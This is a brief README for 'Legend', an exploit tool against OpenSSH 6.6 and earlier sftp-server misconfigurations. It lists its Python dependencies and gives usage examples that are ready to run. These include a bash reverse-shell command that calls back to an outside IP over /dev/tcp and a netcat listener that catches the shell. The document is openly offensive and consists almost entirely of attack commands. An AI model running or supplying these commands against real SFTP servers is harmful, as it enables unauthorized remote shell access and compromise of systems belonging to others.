# Legend
OpenSSH &lt;= 6.6 SFTP (sftp-server) misconfiguration exploit



## Dependencies
pip3 install paramiko

pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git



## Usage
Reverse shell with python
```sh
./legend.py -r $sftp_ip -p $sftp_port -u $sftp_user -P $sftp_pass -b "$your_ip $your_port"
```

Reverse shell with bash
```sh
./legend.py -r 1.1.1.1 -p 22 -u user -P pass -c "/bin/bash -pi >& /dev/tcp/2.2.2.2/443 0>&1"
```

Listening on $your_port
```
sudo nc -nlvp 443
```
